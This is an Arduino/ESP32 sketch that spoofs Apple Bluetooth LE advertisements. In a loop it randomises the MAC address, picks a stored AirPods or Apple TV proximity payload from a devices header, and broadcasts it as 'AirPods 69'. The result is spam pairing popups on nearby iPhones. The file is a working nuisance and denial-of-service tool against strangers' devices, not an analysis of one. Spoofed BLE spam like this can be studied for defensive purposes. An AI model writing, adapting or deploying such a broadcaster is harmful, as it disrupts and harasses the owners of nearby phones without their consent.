// This example takes heavy inpsiration from the ESP32 example by ronaldstoner
// Based on the previous work of chipik / _hexway / ECTO-1A & SAY-10
// See the README for more info
#include <Arduino.h>

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

#include "devices.h"

BLEAdvertising *pAdvertising;  // global variable
uint32_t delaySeconds = 1;

void setup() {
  Serial.begin(115200);
  Serial.println("Starting ESP32 BLE");

  // This is specific to the AirM2M ESP32 board
  // https://wiki.luatos.com/chips/esp32c3/board.html
  pinMode(12, OUTPUT);
  pinMode(13, OUTPUT);

  BLEDevice::init("AirPods 69");

  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  // seems we need to init it with an address in setup() step.
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void loop() {
  // Turn lights on during "busy" part
  digitalWrite(12, HIGH);
  digitalWrite(13, HIGH);

  // First generate fake random MAC
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);

    // It seems for some reason first 4 bits
    // Need to be high (aka 0b1111), so we 
    // OR with 0xF0
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Randomly pick data from one of the devices
  // First decide short or long
  // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
  int device_choice = random(2);
  if (device_choice == 0){
    int index = random(17);
    oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
  } else {
    int index = random(12);
    oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
  }

  // It seems like for pairing some kind of devices,
  // it is best if the advertisement type (adv_type)
  // is ADV_TYPE_SCAN_IND, or ADV_NONCONN_IND 
  // but this is not confirmed.

  // For now we will randomly pick between them
  // 0 = ADV_TYPE_IND, 
  // 1 = ADV_TYPE_SCAN_IND
  // 2 = ADV_TYPE_NONCONN_IND
  int adv_type_choice = random(3);
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  // Set the device address, advertisement data
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);

  // Start advertising
  Serial.println("Sending Advertisement...");
  pAdvertising->start();

  // Turn lights off while "sleeping"
  digitalWrite(12, LOW);
  digitalWrite(13, LOW);
  delay(delaySeconds * 1000); // delay for delaySeconds seconds
  pAdvertising->stop();
}